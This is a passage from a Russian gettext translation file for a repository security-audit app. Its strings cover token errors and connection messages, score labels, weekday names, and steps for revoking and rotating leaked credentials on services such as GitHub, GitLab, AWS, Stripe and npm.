"Нажмите «AI Fix» у находки, где он есть. Вы получите файл и кнопку, которая "
"откроет пул-реквест в отдельной ветке — в основную ветку ничего не пишется."

#: app/guide.py:78
msgid "Put the badge in your README"
msgstr "Поставьте бейдж в README"

#: app/guide.py:79
msgid ""
"One click opens the pull request that adds it. A badge is how the next "
"person finds their way here."
msgstr ""
"Один клик открывает пул-реквест, который его добавит. Бейдж — это то, как "
"сюда попадёт следующий."

#: app/models.py:53
msgid ""
"The access token has expired or been revoked. Create a new one and reconnect "
"to resume audits."
msgstr ""
"Токен доступа истёк или был отозван. Создайте новый и переподключитесь, "
"чтобы аудиты возобновились."

#: app/models.py:55
msgid ""
"The access token is missing a required scope. Recreate it with read access "
"to your repositories."
msgstr ""
"У токена доступа нет нужного права. Пересоздайте его с доступом на чтение "
"репозиториев."

#: app/models.py:57
msgid ""
"We could not reach the provider the last time we tried. If this is a self-"
"hosted instance, check that it is reachable."
msgstr ""
"В прошлый раз мы не смогли достучаться до провайдера. Если это self-hosted "
"инстанс, проверьте его доступность."

#: app/models.py:380
msgid "N/A"
msgstr "N/A"

#: app/models.py:381 app/templates/app/scan_result.html:248
msgid "Excellent"
msgstr "Отлично"

#: app/models.py:382 app/templates/app/scan_result.html:248
msgid "Good"
msgstr "Хорошо"

#: app/models.py:383 app/templates/app/scan_result.html:248
msgid "Fair"
msgstr "Средне"

#: app/models.py:384
msgid "Poor"
msgstr "Плохо"

#: app/models.py:1007
msgid "Monday"
msgstr "Понедельник"

#: app/models.py:1007
msgid "Tuesday"
msgstr "Вторник"

#: app/models.py:1007
msgid "Wednesday"
msgstr "Среда"

#: app/models.py:1008
msgid "Thursday"
msgstr "Четверг"

#: app/models.py:1008
msgid "Friday"
msgstr "Пятница"

#: app/models.py:1008
msgid "Saturday"
msgstr "Суббота"

#: app/models.py:1009
msgid "Sunday"
msgstr "Воскресенье"

#: app/repo_client.py:44 app/repo_client.py:680
msgid ""
"This repository is empty — it has no commits yet, so there is nothing to "
"audit. Push a first commit and run the audit again."
msgstr ""
"Репозиторий пуст — в нём ещё нет ни одного коммита, проверять нечего. "
"Сделайте первый коммит и запустите аудит снова."

#: app/repo_client.py:724
msgid ""
"GitHub rejected the connected token. It has expired or been revoked — create "
"a new one and reconnect on the profile page."
msgstr ""
"GitHub отклонил подключённый токен: он истёк или отозван. Создайте новый и "
"переподключите аккаунт на странице профиля."

#: app/repo_client.py:727
#, python-format
msgid ""
"GitHub refused the request. The token is valid but not allowed to read "
"%(repo)s — it may be missing the \"repo\" scope, or an organisation has not "
"approved it."
msgstr ""
"GitHub отказал в запросе. Токен действителен, но не имеет доступа к %(repo)s "
"— возможно, не хватает scope «repo» или организация не одобрила токен."

#: app/repo_client.py:731
#, python-format
msgid ""
"%(repo)s could not be read. It may have been renamed, deleted or made "
"private, or the token cannot see it — a fine-grained token has to list the "
"repository explicitly."
msgstr ""
"Не удалось прочитать %(repo)s. Репозиторий мог быть переименован, удалён или "
"стать приватным, либо токен его не видит — fine-grained токен должен явно "
"перечислять репозиторий."

#: app/repo_client.py:735
msgid ""
"Could not reach GitHub. This is usually temporary — try the audit again."
msgstr ""
"Не удалось связаться с GitHub. Обычно это временно — запустите аудит ещё раз."

#: app/repo_client.py:736
#, python-format
msgid "GitHub returned an unexpected error (%(code)s) for %(repo)s."
msgstr "GitHub вернул неожиданную ошибку (%(code)s) для %(repo)s."

#: app/repo_client.py:743
msgid ""
"GitLab rejected the connected token. It has expired or been revoked — create "
"a new one with the read_api scope and reconnect on the profile page."
msgstr ""
"GitLab отклонил подключённый токен: он истёк или отозван. Создайте новый со "
"scope read_api и переподключите аккаунт на странице профиля."

#: app/repo_client.py:746
msgid ""
"GitLab refused the request. The token is missing the read_api scope, or the "
"account cannot read this project."
msgstr ""
"GitLab отказал в запросе. У токена нет scope read_api, либо аккаунт не может "
"читать этот проект."

#: app/repo_client.py:749
msgid ""
"The project could not be read. It may have been renamed, deleted or moved, "
"or the token cannot see it."
msgstr ""
"Не удалось прочитать проект. Он мог быть переименован, удалён или перемещён, "
"либо токен его не видит."

#: app/repo_client.py:752
msgid ""
"Could not reach GitLab. If this is a self-hosted instance, check that the "
"server is reachable and the URL is right."
msgstr ""
"Не удалось связаться с GitLab. Если это self-hosted, проверьте доступность "
"сервера и правильность URL."

#: app/repo_client.py:754
#, python-format
msgid "GitLab returned an unexpected error (%(code)s)."
msgstr "GitLab вернул неожиданную ошибку (%(code)s)."

#: app/repo_client.py:765
msgid ""
"No GitLab account is connected. Connect one on the profile page and run the "
"audit again."
msgstr ""
"Аккаунт GitLab не подключён. Подключите его на странице профиля и запустите "
"аудит снова."

#: app/repo_client.py:775
msgid ""
"No GitHub account is connected. Connect one on the profile page and run the "
"audit again."
msgstr ""
"Аккаунт GitHub не подключён. Подключите его на странице профиля и запустите "
"аудит снова."

#: app/secret_incidents.py:43
msgid ""
"Open GitHub → Settings → Developer settings → Personal access tokens "
"(classic and fine-grained) and delete this token. An OAuth or App token "
"(gho_/ghu_/ghs_) is revoked from the app that issued it."
msgstr ""
"Откройте GitHub → Settings → Developer settings → Personal access tokens "
"(classic и fine-grained) и удалите этот токен. OAuth- или App-токен (gho_/"
"ghu_/ghs_) отзывается в приложении, которое его выдало."

#: app/secret_incidents.py:44
msgid ""
"Create a replacement with only the scopes and repositories the job needs, "
"and a short expiry."
msgstr ""
"Создайте замену только с нужными правами и репозиториями и коротким сроком "
"действия."

#: app/secret_incidents.py:45
msgid ""
"Store it as a repository or organisation secret (Actions → Secrets) or in "
"your secret manager, never in the code."
msgstr ""
"Храните его как секрет репозитория или организации (Actions → Secrets) или в "
"менеджере секретов, но не в коде."

#: app/secret_incidents.py:46
msgid ""
"Check the security log (Settings → Security log) for use you do not "
"recognise since the commit that added it."
msgstr ""
"Проверьте журнал безопасности (Settings → Security log) на незнакомую "
"активность с момента коммита, который его добавил."

#: app/secret_incidents.py:53
msgid ""
"Open GitLab → User settings → Access tokens (or the project/group Access "
"tokens page) and revoke this token."
msgstr ""
"Откройте GitLab → User settings → Access tokens (или страницу Access tokens "
"проекта/группы) и отзовите этот токен."

#: app/secret_incidents.py:54
msgid "Create a replacement with the narrowest scope and an expiry date."
msgstr "Создайте замену с минимальными правами и сроком действия."

#: app/secret_incidents.py:55
msgid ""
"Store it as a masked, protected CI/CD variable (Settings → CI/CD → "
"Variables), never in the code."
msgstr ""
"Храните его как masked и protected переменную CI/CD (Settings → CI/CD → "
"Variables), но не в коде."

#: app/secret_incidents.py:56
msgid ""
"Review the audit events for the account or project since the commit that "
"added it."
msgstr ""
"Проверьте события аудита аккаунта или проекта с момента коммита, который его "
"добавил."

#: app/secret_incidents.py:63
msgid ""
"In IAM, find the user that owns this access key, create a new key, then "
"deactivate and delete the old one."
msgstr ""
"В IAM найдите пользователя, которому принадлежит ключ, создайте новый ключ, "
"затем деактивируйте и удалите старый."

#: app/secret_incidents.py:64
msgid ""
"Prefer no long-lived key at all: an IAM role, or OIDC federation for CI "
"(GitHub/GitLab → AWS)."
msgstr ""
"Лучше обойтись без долгоживущего ключа: IAM-роль или OIDC-федерация для CI "
"(GitHub/GitLab → AWS)."

#: app/secret_incidents.py:65
msgid ""
"Search CloudTrail for the old key ID since the commit that added it; look "
"for unfamiliar regions and IAM, EC2 or S3 activity."
msgstr ""
"Поищите в CloudTrail старый ID ключа с момента коммита, который его добавил: "
"незнакомые регионы, активность в IAM, EC2 или S3."

#: app/secret_incidents.py:66
msgid ""
"Put the new credentials in a secret manager or CI secret, never in the code."
msgstr ""
"Положите новые учётные данные в менеджер секретов или секреты CI, но не в "
"код."

#: app/secret_incidents.py:73
msgid ""
"In api.slack.com/apps open the app → OAuth & Permissions and rotate (or "
"revoke) the token; for a webhook, delete it and create a new one."
msgstr ""
"В api.slack.com/apps откройте приложение → OAuth & Permissions и смените "
"(или отзовите) токен; webhook удалите и создайте новый."

#: app/secret_incidents.py:74
msgid "Review the workspace access logs for unfamiliar use."
msgstr ""
"Проверьте журналы доступа рабочего пространства на незнакомую активность."

#: app/secret_incidents.py:75
msgid "Store the new token in a secret manager or CI secret."
msgstr "Храните новый токен в менеджере секретов или секретах CI."

#: app/secret_incidents.py:82
msgid ""
"Dashboard → Developers → API keys → \"Roll key\" on this secret or "
"restricted key; set the old one to expire now."
msgstr ""
"Dashboard → Developers → API keys → «Roll key» для этого ключа; старый пусть "
"истечёт сразу."

#: app/secret_incidents.py:83
msgid ""
"Check Developers → Logs and recent payouts, refunds and customers for "
"anything you did not do."
msgstr ""
"Проверьте Developers → Logs, а также последние выплаты, возвраты и клиентов "
"на действия, которых вы не совершали."

#: app/secret_incidents.py:84
msgid "Prefer a restricted key with only the permissions the service uses."
msgstr ""
"Лучше использовать restricted-ключ только с теми правами, которые нужны "
"сервису."

#: app/secret_incidents.py:91
msgid ""
"Delete this key at platform.openai.com/api-keys and create a new one scoped "
"to the project."
msgstr ""
"Удалите ключ на platform.openai.com/api-keys и создайте новый, ограниченный "
"проектом."

#: app/secret_incidents.py:92
msgid ""
"Check Usage for spend you do not recognise, and set a monthly budget limit."
msgstr ""
"Проверьте Usage на незнакомые расходы и установите месячный лимит бюджета."

#: app/secret_incidents.py:99
msgid ""
"Disable and delete this key in the Anthropic Console → API keys, and create "
"a new one."
msgstr ""
"Отключите и удалите ключ в Anthropic Console → API keys и создайте новый."

#: app/secret_incidents.py:100
msgid ""
"Check Usage for spend you do not recognise, and set a spend limit on the "
"workspace."
msgstr ""
"Проверьте Usage на незнакомые расходы и установите лимит расходов на рабочее "
"пространство."

#: app/secret_incidents.py:107
msgid ""
"In @BotFather send /revoke, choose the bot, and take the new token it gives "
"you."
msgstr ""
"В @BotFather отправьте /revoke, выберите бота и возьмите выданный новый "
"токен."

#: app/secret_incidents.py:108
msgid ""
"Anyone with the old token could read the bot's messages and act as the bot — "
"check the bot's chats and webhook (getWebhookInfo) for changes."
msgstr ""
"Владелец старого токена мог читать сообщения бота и действовать от его имени "
"— проверьте чаты бота и webhook (getWebhookInfo) на изменения."

#: app/secret_incidents.py:115
msgid "APIs & Services → Credentials: regenerate or delete this key."
msgstr "APIs & Services → Credentials: перевыпустите или удалите этот ключ."

#: app/secret_incidents.py:116
msgid ""
"Restrict the new key to the APIs and the HTTP referrers / IPs that use it."
msgstr ""
"Ограничьте новый ключ нужными API и HTTP-referrer / IP, которые его "
"используют."

#: app/secret_incidents.py:123
msgid ""
"Settings → API Keys: delete this key and create one with only \"Mail Send\"."
msgstr ""
"Settings → API Keys: удалите ключ и создайте новый только с правом «Mail "
"Send»."

#: app/secret_incidents.py:124
msgid ""
"Check Activity for mail you did not send — a leaked mail key is a phishing "
"tool."
msgstr ""
"Проверьте Activity на письма, которых вы не отправляли, — утёкший почтовый "
"ключ используют для фишинга."

#: app/secret_incidents.py:131
msgid ""
"npmjs.com → Access Tokens: delete this token; create a granular one limited "
"to the packages it publishes."
msgstr ""
"npmjs.com → Access Tokens: удалите токен; создайте granular-токен только для "
"публикуемых им пакетов."

#: app/secret_incidents.py:132
msgid "Check your packages' recent versions for releases you did not publish."
msgstr ""
"Проверьте последние версии своих пакетов на релизы, которые вы не "
"публиковали."

#: app/secret_incidents.py:139
msgid ""
"Revoke or change this credential where it was issued — treat it as known to "
"anyone who could read the repository."
msgstr ""
